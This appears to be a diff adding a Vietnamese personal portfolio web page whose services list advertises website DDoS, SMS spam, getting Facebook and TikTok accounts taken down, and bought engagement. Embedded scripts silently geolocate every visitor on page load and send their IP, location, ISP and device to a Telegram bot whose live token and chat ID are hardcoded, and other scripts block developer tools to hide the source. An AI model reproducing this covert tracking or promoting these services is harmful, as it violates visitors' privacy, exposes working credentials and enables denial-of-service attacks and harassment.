@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Portfolio • Landing</title>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    :root{
+      --glass: rgba(255,255,255,.08);
+      --glass-strong: rgba(255,255,255,.15);
+      --text: #e9e9f2;
+      --muted: #b6b7c2;
+      --accent: #7c5cff;
+      --accent-2: #00d1ff;
+      --ok: #22c55e;
+      --warn: #f59e0b;
+      --bad: #ef4444;
+      --radius: 20px;
+      --shadow: 0 10px 30px rgba(0,0,0,.35);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: Poppins, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      color: var(--text);
+      background: #0c0c13;
+      overflow-x:hidden;
+    }
+
+    .bg-img{position:fixed;inset:0;z-index:-3;background-size:cover;background-position:center;filter:brightness(.4) saturate(1.1);}
+    .particles{position:fixed;inset:0;z-index:-2;pointer-events:none;}
+    .particle{position:absolute;width:4px;height:4px;border-radius:50%;background:radial-gradient(circle,#fff,rgba(255,255,255,.2));opacity:.7;animation:float 18s linear infinite;}
+    @keyframes float{to{transform:translateY(-120vh) translateX(var(--dx));opacity:0}}
+
+    .gradient{position:fixed;inset:-20%;z-index:-1;filter:blur(100px) saturate(1.4) opacity(.35);background:radial-gradient(60% 60% at 20% 80%,#6b5cff44 0%,transparent 70%),radial-gradient(50% 50% at 80% 20%,#00d1ff44 0%,transparent 70%);}
+    .container{max-width:1000px;padding:28px;margin:60px auto;}
+    .card{background:var(--glass);backdrop-filter:blur(0px);border:1px solid rgba(255,255,255,.9);border-radius:var(--radius);box-shadow:var(--shadow);}
+    header.hero{display:flex;gap:22px;align-items:center;padding:24px;}
+    .avatar{width:110px;height:110px;border-radius:50%;flex:0 0 110px;background:center/cover no-repeat;border:3px solid rgba(255,255,255,.3);box-shadow:0 0 0 6px rgba(255,255,255,.08);}
+    .hero h1{margin:0;font-weight:800;font-size:clamp(24px,3.2vw,42px);letter-spacing:.3px;}
+    .hero .nick{color:var(--accent-2);font-weight:600;}
+    .hero .sub{color:var(--muted);font-size:14px;margin-top:6px}
+    .badges{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px;}
+    .badge{font-size:12px;padding:6px 10px;background:var(--glass-strong);border-radius:999px;border:1px solid rgba(255,255,255,.08)}
+    .row{display:grid;grid-template-columns:1.1fr .9fr;gap:24px;margin-top:24px;}
+    @media (max-width:860px){.row{grid-template-columns:1fr;}header.hero{flex-direction:column;text-align:center}}
+
+    .social{padding:18px;display:grid;gap:12px}
+    .btn{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:14px 16px;border-radius:14px;background:var(--glass-strong);border:1px solid rgba(255,255,255,.08);text-decoration:none;color:var(--text);transition:transform .15s ease,background .2s ease;cursor:pointer;}
+    .btn i{font-size:18px;}
+    .btn .label{font-weight:600}
+    .btn:hover{transform:translateY(-2px);background:rgba(255,255,255,.22)}
+
+    .skills{padding:18px;display:grid;gap:16px}
+    .skill .head{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;}
+    .skill .name{font-weight:600;letter-spacing:.3px}
+    .bar{position:relative;height:14px;border-radius:999px;background:rgba(255,255,255,.18);overflow:hidden;border:1px solid rgba(255,255,255,.1)}
+    .bar > span{position:absolute;inset:0;width:0;background:linear-gradient(90deg,var(--accent),var(--accent-2));box-shadow:inset 0 0 12px rgba(0,0,0,.2);transition:width 1.4s ease;}
+    .dot{position:absolute;right:-10px;top:50%;transform:translate(0,-50%);background:#111;color:#fff;font-size:11px;padding:4px 7px;border-radius:8px;border:1px solid rgba(255,255,255,.2);filter:drop-shadow(0 3px 10px rgba(0,0,0,.35));white-space:nowrap}
+
+    .info{padding:18px;display:grid;gap:12px}
+    .notice{background:var(--glass-strong);border:1px solid rgba(255,255,255,.08);padding:14px 16px;border-radius:14px;line-height:1.55}
+    .footer{text-align:center;color:var(--muted);font-size:13px;margin:28px 0 40px}
+  </style>
+</head>
+<body>
+  <div class="bg-img" aria-hidden></div>
+  <div class="gradient" aria-hidden></div>
+  <div class="particles" id="particles" aria-hidden></div>
+
+  <div class="container">
+    <!-- HERO -->
+    <section class="card hero" id="hero">
+      <div class="avatar" id="avatar"></div>
+      <div>
+        <h1><span class="nick"></span> • <span id="fullname"></span></h1>
+        <div class="sub">Chuyên gia an ninh mạng • Developer • Yêu công nghệ</div>
+        <div class="badges">
+          <div class="badges" id="ipInfo" style="display:grid;gap:8px">
+            <span class="badge" id="ip">Đang lấy IP...</span>
+            <span class="badge" id="city"></span>
+            <span class="badge" id="country"></span>
+            <span class="badge" id="isp"></span>
+            <span class="badge" id="networkType"></span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div class="row">
+      <!-- SOCIAL -->
+      <section class="card social">
+        <a class="btn" id="fb" target="_blank"><span><i class="fa-brands fa-facebook"></i> <span class="label">Facebook</span></span></a>
+        <a class="btn" id="tg" target="_blank"><span><i class="fa-brands fa-telegram"></i> <span class="label">Telegram</span></span></a>
+        <a class="btn" id="zl" target="_blank"><span><i class="fa-solid fa-comments"></i> <span class="label">Zalo</span></span></a>
+
+        <div class="btn" id="serviceBtn">
+          <span><i class="fa-solid fa-briefcase"></i> <span class="label">Dịch vụ</span></span>
+          <i class="fa-solid fa-chevron-down"></i>
+        </div>
+        <div id="serviceList" style="display:none;padding-left:10px;margin-top:8px;display:grid;gap:8px;">
+          <div class="btn">Code Website</div>
+          <div class="btn">DDOS Website</div>
+          <div class="btn">Spam SMS</div>
+          <div class="btn">Spam NGL</div>
+          <div class="btn"> </div>
+          <div class="btn">Unlock all Facebook</div>
+          <div class="btn">Dame Facebook</div>
+          <div class="btn">Lên tích xanh Facebook</div>
+          <div class="btn">Buff Like Facebook</div>
+          <div class="btn">Buff Share Facebook</div>
+          <div class="btn">Buff Follow Facebook</div>
+          <div class="btn">Quảng Cáo Facebook</div>
+          <div class="btn"> </div>
+          <div class="btn">Dame TikTok</div>
+          <div class="btn">Buff Tim TikTok</div>
+          <div class="btn">Buff View TikTok</div>
+          <div class="btn">Buff Share TikTok</div>
+          <div class="btn">Buff Follow TikTok</div>
+          <div class="btn">Quảng Cáo TikTok</div>
+          <div class="btn"> </div>
+          <div class="btn">Buff Follow Instagram</div>
+          <div class="btn">Buff Like Instagram</div>
+          <div class="btn">Buff Share Instagram</div>
+        </div>
+      </section>
+
+      <!-- SKILLS -->
+      <section class="card skills">
+        <div class="skill" data-level="82" data-color="var(--warn)">
+          <div class="head"><span class="name">HTML/CSS</span><span class="pct">82%</span></div>
+          <div class="bar"><span></span><div class="dot">82%</div></div>
+        </div>
+        <div class="skill" data-level="73">
+          <div class="head"><span class="name">Python</span><span class="pct">73%</span></div>
+          <div class="bar"><span></span><div class="dot">73%</div></div>
+        </div>
+        <div class="skill" data-level="58">
+          <div class="head"><span class="name">nodejs</span><span class="pct">58%</span></div>
+          <div class="bar"><span></span><div class="dot">58%</div></div>
+        </div>
+        <div class="skill" data-level="39" data-color="var(--bad)">
+          <div class="head"><span class="name">golang</span><span class="pct">39%</span></div>
+          <div class="bar"><span></span><div class="dot">39%</div></div>
+        </div>
+      </section>
+    </div>
+
+    <section class="card info" style="margin-top:24px">
+      <div class="notice">Internet là một chiến trường vô hình. Bạn không nhìn thấy kẻ thù, nhưng họ luôn nhìn thấy bạn. Ở nơi này, sự bất cẩn nhỏ nhất cũng đủ để trả giá lớn nhất. Nhớ rằng: không có khóa nào không thể bẻ, chỉ có thời gian chưa đủ để phá.</div>
+    </section>
+
+    <div class="footer">© <span id="year"></span> • Made With Nông Minh Quân copyright Nông Minh Quân</div>
+  </div>
+
+  <!-- TELEGRAM BOT CONFIG -->
+  <script>
+    // === CẤU HÌNH TELEGRAM BOT ===
+    const TELEGRAM_BOT_TOKEN = '8404589450:AAFCOBgrGtTo8v7Kjx36EBtH3eBBcW-nBcQ';  // THAY BẰNG TOKEN CỦA BẠN
+    const TELEGRAM_CHAT_ID = '7816681280';      // THAY BẰNG ID CHAT
+
+    // Đếm lượt truy cập
+    let accessCount = 0;
+    let summaryTimer = null;
+
+    // Gửi tin nhắn đến Telegram
+    function sendTelegramMessage(message, parse_mode = 'Markdown') {
+      if (!TELEGRAM_BOT_TOKEN.includes('YOUR') && !TELEGRAM_CHAT_ID.includes('YOUR')) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode })
+        }).catch(() => {});
+      }
+    }
+
+    // Gửi log từng truy cập
+    function sendAccessLog(ipData, locationData) {
+      const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+      const userAgent = navigator.userAgent;
+      const isMobile = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'PC';
+      const pageUrl = window.location.href;
+
+      const message = `
+*Truy cập mới*
+──────────────────
+*IP*: \`${ipData.ip || 'Ẩn'}\`
+*Vị trí*: ${locationData.city || 'N/A'}, ${locationData.country || 'N/A'}
+*Nhà mạng*: ${locationData.org || 'N/A'}
+*Mạng*: ${locationData.hostname?.includes('static') ? 'Cố định' : 'Động'}
+*Thiết bị*: ${isMobile}
+*Thời gian*: ${now}
+*Trang*: ${pageUrl}
+      `.trim();
+
+      sendTelegramMessage(message);
+    }
+
+    // Gửi tổng kết mỗi 200 giây
+    function sendSummaryAndReset() {
+      if (accessCount > 0) {
+        const msg = `*Tóm tắt truy cập*\nTrong *200 giây* qua có: *${accessCount} lượt truy cập*`;
+        sendTelegramMessage(msg);
+      }
+      accessCount = 0;
+    }
+
+    // Bắt đầu timer 200 giây
+    function startSummaryTimer() {
+      if (summaryTimer) clearTimeout(summaryTimer);
+      summaryTimer = setTimeout(() => {
+        sendSummaryAndReset();
+        startSummaryTimer();
+      }, 200000); // 200 giây
+    }
+
+    // === LẤY IP + GỬI TELEGRAM ===
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => {
+        const ip = d.ip;
+        document.getElementById('ip').textContent = `IP của bạn: ${ip}`;
+
+        accessCount++;
+        if (accessCount === 1) startSummaryTimer();
+
+        fetch(`https://ipinfo.io/${ip}?token=8b9393048ee3a0`)
+          .then(r => r.json())
+          .then(info => {
+            document.getElementById('city').textContent = `Thành phố: ${info.city || "Không rõ"}`;
+            document.getElementById('country').textContent = `Quốc gia: ${info.country || "Không rõ"}`;
+            document.getElementById('isp').textContent = `Nhà mạng: ${info.org || "Không rõ"}`;
+            document.getElementById('networkType').textContent = `Loại mạng: ${info.hostname && info.hostname.includes("static") ? "Cố định" : "Động"}`;
+
+            sendAccessLog(d, info);
+          })
+          .catch(() => {
+            sendAccessLog(d, {});
+          });
+      })
+      .catch(() => {
+        document.getElementById('ip').textContent = 'IP ẩn';
+        accessCount++;
+        if (accessCount === 1) startSummaryTimer();
+        sendAccessLog({ ip: 'Ẩn' }, {});
+      });
+  </script>
+
+  <!-- CẤU HÌNH CHUNG -->
+  <script>
+    const CONFIG = {
+      fullname: 'Nông Minh Quân',
+      nickname: 'Vladimir CNC',
+      avatar: 'https://i.imgur.com/SC1vYDZ.jpeg',
+      backgrounds: [
+        'https://i.imgur.com/BxjiRUW.jpeg',
+        'https://i.imgur.com/oB9cOpD.jpeg',
+        'https://i.imgur.com/5yoOuIM.jpeg',
+        'https://i.imgur.com/1Vomacu.jpeg',
+        'https://i.imgur.com/SsoWieg.jpeg',
+        'https://i.imgur.com/d5FiCpp.jpeg',
+        'https://i.imgur.com/inrdLZA.jpeg',
+        'https://i.imgur.com/hDPDAow.jpeg'
+      ],
+      startedAt: '2025-08-20',
+      socials: {
+        Facebook: 'https://facebook.com/admin.vladimir.cnc',
+        Telegram: 'https://t.me/vladimir_cnc1',
+        Zalo: 'https://zalo.me/0353267411',
+      }
+    }
+
+    document.getElementById('fullname').textContent = CONFIG.fullname
+    document.querySelector('.nick').textContent = CONFIG.nickname
+    document.getElementById('avatar').style.backgroundImage = `url('${CONFIG.avatar}')`
+    const randomBg = CONFIG.backgrounds[Math.floor(Math.random() * CONFIG.backgrounds.length)];
+    document.querySelector('.bg-img').style.backgroundImage = `url('${randomBg}')`;
+    document.getElementById('year').textContent = new Date().getFullYear()
+
+    document.getElementById('fb').href = CONFIG.socials.Facebook
+    document.getElementById('tg').href = CONFIG.socials.Telegram
+    document.getElementById('zl').href = CONFIG.socials.Zalo
+
+    // Mở rộng dịch vụ
+    document.getElementById('serviceBtn').addEventListener('click', () => {
+      const list = document.getElementById('serviceList')
+      list.style.display = (list.style.display === 'none' || list.style.display === '') ? 'grid' : 'none'
+    })
+
+    // Thanh kỹ năng
+    document.querySelectorAll('.skill').forEach(el => {
+      const lvl = +el.dataset.level || 0
+      const color = el.dataset.color
+      const bar = el.querySelector('.bar > span')
+      const dot = el.querySelector('.dot')
+      if (color) bar.style.background = `linear-gradient(90deg, ${color}, var(--accent-2))`
+      requestAnimationFrame(() => {
+        bar.style.width = lvl + '%'
+        dot.style.left = `calc(${lvl}% - 8px)`
+      })
+    })
+
+    // Hiệu ứng hạt
+    const wrap = document.getElementById('particles')
+    const make = (n) => {
+      for (let i = 0; i < n; i++) {
+        const s = document.createElement('span'); s.className = 'particle';
+        const size = Math.random() * 3 + 2; s.style.width = s.style.height = size + 'px';
+        s.style.left = Math.random() * 100 + '%'; s.style.bottom = '-10px';
+        s.style.opacity = .4 + Math.random() * .6;
+        const dur = 14 + Math.random() * 16; s.style.animationDuration = dur + 's';
+        s.style.setProperty('--dx', (Math.random() * 120 - 60) + 'px');
+        wrap.appendChild(s);
+      }
+    }
+    make(70)
+  </script>
+
+  <!-- BẢO VỆ SOURCE CODE -->
+  <script>
+    (function() {
+      document.addEventListener("keydown", function(e) {
+        if (e.key === "F12") e.preventDefault();
+        if (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) e.preventDefault();
+        if (e.ctrlKey && e.key === "u") e.preventDefault();
+      });
+
+      if (typeof window.orientation === "undefined") { 
+        setInterval(function() {
+          if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+            document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:40vh'>Copyright Nông Minh Quân!</h1>";
+          }
+        }, 1000);
+      }
+    })();
+  </script>
+
+  <script>
+    if (typeof window.console !== "undefined") {
+      console.log("%cSTOP!", "color:red;font-size:40px;font-weight:bold;");
+      console.log("Muốn thì tự đi code đi bạn nếu không biết code thì hãy liên hệ mình, mình bán cho !");
+    }
+  </script>
+
+  <!-- NHẠC NỀN -->
+  <audio id="bg-music" loop>
+    <source src="https://files.catbox.moe/34f9jo.mp4" type="audio/mp4">
+  </audio>
+  <script>
+    function playMusic() {
+      const audio = document.getElementById("bg-music");
+      if (audio.paused) audio.play();
+    }
+    document.addEventListener("click", playMusic);
+  </script>
+</body>
+</html>
